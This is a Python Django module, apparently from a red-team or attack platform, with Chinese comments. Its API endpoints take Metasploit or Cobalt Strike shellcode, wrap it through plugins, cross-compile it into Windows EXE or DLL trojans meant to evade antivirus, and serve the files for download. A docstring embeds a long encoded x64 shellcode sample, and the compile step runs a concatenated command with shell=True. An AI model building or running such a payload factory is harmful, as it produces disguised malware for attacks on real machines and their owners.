#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import time
import json
import sys
import os
from ClassCongregation import ErrorLog,GetTempFilePath,GetTrojanFilePath,GetTrojanModulesFilePath,randoms
from Web.WebClassCongregation import UserInfo,TrojanData
from django.http import JsonResponse,FileResponse
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
from Web.celery import app
import importlib


Language2Command={
    "linux":
        {
            "c":
            {
                "x86":
                {
                    "exe":"i686-w64-mingw32-gcc -mwindows -o ",
                    "dll":"i686-w64-mingw32-gcc -fPIC -shared -o "
                },
                "x64":
                {
                    "exe": "x86_64-w64-mingw32-gcc -o ",
                    "dll": "x86_64-w64-mingw32-gcc -fPIC -shared -o "
                }
            },
            "c++":
            {
                "x86":
                {
                    "exe": "i686-w64-mingw32-g++ -mwindows -o ",
                    "dll": "i686-w64-mingw32-g++ -fPIC -shared -o "#编译c++dll的时候需要在每个函数前面添加extern "C"，不然导出函数是C++编译器编译之后的函数名
                },
                "x64":
                {
                    "exe": "x86_64-w64-mingw32-g++ -o ",
                    "dll": "x86_64-w64-mingw32-g++ -fPIC -shared -o "
                }
            },
            #不支持交叉编译dll程序
            "go":
            {
                "x86":
                {
                    "dll": None,
                    "exe": "GOOS=windows GOARCH=386 go build -o ",
                },
                "x64":
                {
                    "dll": None,
                    "exe": "GOOS=windows GOARCH=amd64 go build -o ",
                }

            },
            "nim":
            {
                    "x86":
                        {
                            "exe": "nim c -d:mingw --app:console  --cpu:i386  --out:",
                            "dll": None#"nim c -d:mingw --app:lib --nomain --cpu:i386 --out:"
                        },
                    "x64":
                        {
                            "exe": "nim c -d:mingw --app:console --cpu:amd64 --out:",
                            "dll": "nim c -d:mingw --app:lib --nomain  --cpu:amd64 --out:"
                        }

                }
        },
    "windows":
        {}
}

@app.task
def CompileCode(Command):#代码编译处理函数
    p = subprocess.call(Command, shell=True)  # 执行生成命令
    if p==0:#执行成功
        TrojanData().UpdateStatus(compilation_status="1", redis_id=CompileCode.request.id)  # 任务结束后更新状态
    else:
        TrojanData().UpdateStatus(compilation_status="-1", redis_id=CompileCode.request.id)  # 任务结束后更新状态



"""get_trojan_plugins
{
	"token": "xxx"
}
"""
def GetTrojanPlugins(request):#获取用户当前木马插件
    RequestLogRecord(request, request_api="get_trojan_plugins")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                ModulesResult=[]#存放全部插件数据
                UserOperationLogRecord(request, request_api="get_trojan_plugins", uid=Uid)
                TrojanModulesFilePath=GetTrojanModulesFilePath().Result()
                PluginList = os.listdir(TrojanModulesFilePath)#获取文件夹中全部文件
                for Plugin in PluginList:#清洗不相关文件
                    if Plugin.endswith(".py") and ("init" not in Plugin):
                        ModulesResult.append(Plugin)
                return JsonResponse({'message': ModulesResult, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetTrojanPlugins(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })




"""shellcode_to_trojan
{
	"token": "xxx",
	"shellcode_type": "1",
	"shellcode_architecture": "x64",
	"plugin":"test.py",
	"shellcode":"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc4\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xa0\\xa2\\xe9\\xe1\\xd3\\xa2\\xe2\\x2f\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xe8\\x93\\x20\\xa9\\x52\\x4b\\x2b\\xd0\\x5f\\x5d\\xa1\\x6c\\xd6\\x4d\\x1d\\xd0\\x5f\\xea\\x52\\xf9\\x05\\xa4\\x17\\xc1\\x0d\\x5b\\x63\\xa9\\xe2\\xfa\\xc5\\x67\\x8d\\x5a\\x16\\x1e\\x2c\\x40\\x16\\x7f\\x47\\x6d\\x54\\x8e\\x97\\x95\\x97\\xc8\\x89\\xec\\x91\\x0a\\x91\\xa4\\x97\\xc8\\x3e\\x1f\\xd2\\x85\\x3a\\x62\\x17\\x97\\xf5\\xa1\\x54\\x3e\\x26\\x7c\\x20\\x1a\\x8e\\x5b\\xe3\\xf0\\x9c\\xaf\\xee\\x8c\\xfb\\xd5\\xe2\\x46\\x2e\\xa1\\x59\\x42\\x7a\\x10\\x66\\x40\\x02\\xa1\\x59\\xf5\\x89\\xb2\\x4b\\x91\\x31\\x17\\x15\\xc7\\x2c\\xd5\\x52\\xf7\\xda\\x16\\x8b\\x45\\xcd\\x62\\x9c\\x4d\\x09\\x39\\xbf\\x4a\\xb6\\x55\\x39\\x0d\\x1c\\x8e\\x71\\xcb\\x73\\xd1\\x3f\\x2a\\x1c\\x8e\\xc6\\x38\\xdb\\x73\\x7a\\xf0\\xfb\\xba\\x91\\x3e\\xb6\\xe5\\x88\\xf2\\xab\\x5c\\x76\\x7c\\x01\\x2b\\x32\\x21\\x8e\\xe7\\xed\\xee\\x67\\xf6\\x12\\x97\\x39\\x29\\x6c\\x2b\\xe3\\xf0\\x30\\x97\\x39\\x9e\\x9f\\x05\\x05\\xcb\\x6c\\xa6\\x8b\\xc1\\x95\\xee\\xd7\\x47\\xe8\\x20\\xeb\\x2e\\xdb\\x59\\x19\\xfd\\x3b\\x37\\x6d\\x81\\x63\\x98\\x43\\xc8\\x7e\\xcb\\x25\\x43\\xd6\\x29\\xfb\\x5a\\x2f\\x9d\\x6d\\x33\\x55\\x0d\\xe3\\x83\\x2c\\xab\\x6d\\x89\\xd5\\x70\\xe3\\x83\\x2c\\xeb\\x6d\\x89\\xf5\\x38\\xe3\\x07\\xc9\\x81\\x6f\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x19\\x63\\xfb\\x6a\\x87\\x28\\x3f\\x0a\\xec\\x0f\\xc6\\x69\\x6a\\xea\\x93\\x99\\x64\\x53\\xcf\\xe3\\xf9\\x28\\xf5\\x89\\x19\\x4a\\x86\\xb8\\x20\\x88\\xf6\\xcb\\x25\\x02\\xcf\\xed\\x6b\\x7c\\x19\\x83\\x24\\xd2\\xd7\\xe3\\xe3\\x10\\x3a\\x40\\x65\\x22\\xce\\x69\\x7b\\xeb\\x28\\x83\\xda\\xcb\\xc6\\xe3\\x9f\\x80\\x36\\xca\\xf3\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x64\\xc3\\x4e\\x65\\xea\\x09\\xbf\\xf3\\xc5\\x77\\x76\\x24\\xa8\\x44\\x5a\\xc3\\x60\\x3b\\x56\\x1d\\x73\\x50\\x3a\\x40\\x65\\x26\\xce\\x69\\x7b\\x6e\\x3f\\x40\\x29\\x4a\\xc3\\xe3\\xeb\\x14\\x37\\xca\\xf5\\x43\\x0c\\x6c\\x23\\x40\\x7f\\x1b\\x64\\x5a\\xc6\\x30\\xf5\\x51\\x24\\x8a\\x7d\\x43\\xde\\x29\\xf1\\x40\\xfd\\x27\\x05\\x43\\xd5\\x97\\x4b\\x50\\x3f\\x92\\x7f\\x4a\\x0c\\x7a\\x42\\x5f\\x81\\x34\\xda\\x5f\\xcf\\xd2\\xaa\\x08\\x7e\\xcb\\x25\\x02\\x87\\x68\\xe3\\x85\\xf3\\xca\\x24\\x02\\x87\\x29\\x11\\x39\\xf5\\xa4\\xa2\\xfd\\x52\\xd3\\x5b\\xbd\\xdc\\x9d\\x64\\xb8\\x21\\xfd\\x16\\x95\\x81\\x1e\\x6d\\x81\\x43\\x40\\x97\\x0e\\x02\\xc1\\xa5\\xf9\\x67\\x1d\\xae\\xb3\\x39\\xd8\\x57\\x6d\\xed\\x68\\xf2\\x49\\xf7\\x11\\xda\\xd7\\xe4\\x09\\xc7\\x6b\\x50\\xae\\x5d\\x67\\x87\\x68\\xab\\x08\\x7e\\x68\\xe3\\x5e\\x68\\x2f"
}
"""

def ShellcodeToTrojan(request):#shellcode转换生成病毒
    RequestLogRecord(request, request_api="shellcode_to_trojan")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Shellcode = json.loads(request.body)["shellcode"]#shellcode字符串
            ShellcodeType = json.loads(request.body)["shellcode_type"] #用来辨别MSF 还是CS
            ShellcodeArchitecture = json.loads(request.body)["shellcode_architecture"]  # 架构类型 X86或者X64
            Plugin = json.loads(request.body)["plugin"]  # 当前shellcode使用的插件
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="shellcode_to_trojan", uid=Uid)
                TrojanModulesFilePath=GetTrojanModulesFilePath().Result()#获取插件文件夹
                PluginList = os.listdir(TrojanModulesFilePath)#获取文件夹中全部文件
                if Plugin.endswith(".py") and (Plugin in PluginList):#判断传入的是否是python插件，并且插件名称是否在列表中
                    try:
                        DynamicLoadingPluginPath = 'Web.TrojanOrVirus.Modules' + "." + Plugin.split('.')[0]  # 去除.py后缀然后进行路径拼接
                        ScriptModule = importlib.import_module(DynamicLoadingPluginPath)  # 动态载入
                        TempFilePath = GetTempFilePath().Result()  # temp文件路径
                        RandomName = randoms().EnglishAlphabet(5) + str(int(time.time()))  # 随机名称
                        VirusOriginalFilePath = TempFilePath + RandomName + ScriptModule.__language__  # 病毒原始文件名，后缀从插件中获取
                        VirusFileStoragePath = GetTrojanFilePath().Result()  # 病毒文件存放路径
                        VirusFileGenerationPath = VirusFileStoragePath + RandomName + ScriptModule.__process__  # 病毒文件生成路径
                        #需要判断语言类型然后对应不同的生成方式
                        if sys.platform == "win32":
                            # windows的暂时没测试
                            return JsonResponse({'message': "暂不支持Windows免杀方式~敬请关注后续更新", 'code': 601, })
                        elif sys.platform == "darwin" or sys.platform == "linux":#判断当前运行的机器类型
                            File = open(VirusOriginalFilePath, "w+")
                            File.write(ScriptModule.main(Shellcode))#获取shellcode传入动态调用函数中，然后写入本地文件
                            File.close()
                            if ShellcodeArchitecture!="x86" and ShellcodeArchitecture!="x64":#判断对应架构
                                return JsonResponse({'message': "暂不支持其他架构~", 'code': 440, })

                            elif ShellcodeArchitecture=="x86" or ShellcodeArchitecture=="x64":
                                Command=Language2Command["linux"][ScriptModule.__language__.split('.')[1]][ShellcodeArchitecture][ScriptModule.__process__.split('.')[1]]#通过文件中的语言类型和生成文件进行提取命令
                                if Command==None:
                                    return JsonResponse({'message': "呐呐呐！该种组合无法进行编译，请使用其他插件~", 'code': 450, })
                                else:
                                    CompleteCommand=Command + VirusFileGenerationPath +" "+VirusOriginalFilePath #进行命令拼接
                                    RedisCompileCodeTask=CompileCode.delay(CompleteCommand)
                                    TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,
                                                       trojan_original_file_name=RandomName + ScriptModule.__language__,
                                                       trojan_generate_file_name=RandomName + ScriptModule.__process__, compilation_status="0",
                                                       redis_id=RedisCompileCodeTask.task_id,
                                                       shellcode_architecture=ShellcodeArchitecture,
                                                       plugin=Plugin)

                                    return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
                        else:
                            return JsonResponse({'message': "你的电脑不是Mac或者Linux无法使用该功能ლ(•̀ _ •́ ლ)", 'code': 600, })
                    except Exception as e:
                        ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-Plugin", e)
                        return JsonResponse({'message': "呐呐呐！你这插件有问题呀！快上服务器看看是不是写错了", 'code': 197, })
                else:
                    return JsonResponse({'message': "小伙子不要搞事情嗷，你不看看插件是否传入正确ლ(•̀ _ •́ ლ)", 'code': 430, })
            else:
                return JsonResponse({'message': "小宝贝这是非法请求哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""trojan_data_query
{
	"token": "xxx",
	"number_of_pages":"20"
}
"""

def TrojanDataQuery(request):#个人用户免杀数据查询
    RequestLogRecord(request, request_api="trojan_data_query")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            NumberOfPages = json.loads(request.body)["number_of_pages"]  # 页数
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="trojan_data_query", uid=Uid)
                AntiAntiVirusDataResult = TrojanData().Query(uid=Uid,number_of_pages=NumberOfPages)  # 获取当前用户的个数
                return JsonResponse({'message': AntiAntiVirusDataResult, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_TrojanDataQuery(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""trojan_data_statistical
{
	"token": "xxx"
}
"""

def TrojanDataStatistical(request):#个人用户数据统计
    RequestLogRecord(request, request_api="trojan_data_statistical")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="trojan_data_statistical", uid=Uid)
                Number=TrojanData().StatisticalData(uid=Uid)#获取当前用户的个数
                return JsonResponse({'message': Number, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_TrojanDataStatistical(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""trojan_file_download_verification
{
	"token": "xxx",
	"trojan_id":"1",
	"trojan_generate_file_name":"xxxx.exe"
}
"""

def TrojanFileDownloadVerification(request):#木马文件下载验证接口
    RequestLogRecord(request, request_api="trojan_file_download_verification")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            TrojanId = json.loads(request.body)["trojan_id"]
            TrojanGenerateFileName = json.loads(request.body)["trojan_generate_file_name"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="trojan_file_download_verification", uid=Uid)
                Result=TrojanData().DownloadVerification(uid=Uid,trojan_id=TrojanId,trojan_generate_file_name=TrojanGenerateFileName)#数据验证
                if Result:
                    VirusFileStoragePath = GetTrojanFilePath().Result()  # 病毒文件存放路径
                    File=open(VirusFileStoragePath+TrojanGenerateFileName,'rb')
                    Response = FileResponse(File)
                    return Response
                else:
                    return JsonResponse({'message': "该文件不是你的，别瞎请求(๑•̀ㅂ•́)و✧", 'code': 402, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_TrojanDataStatistical(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })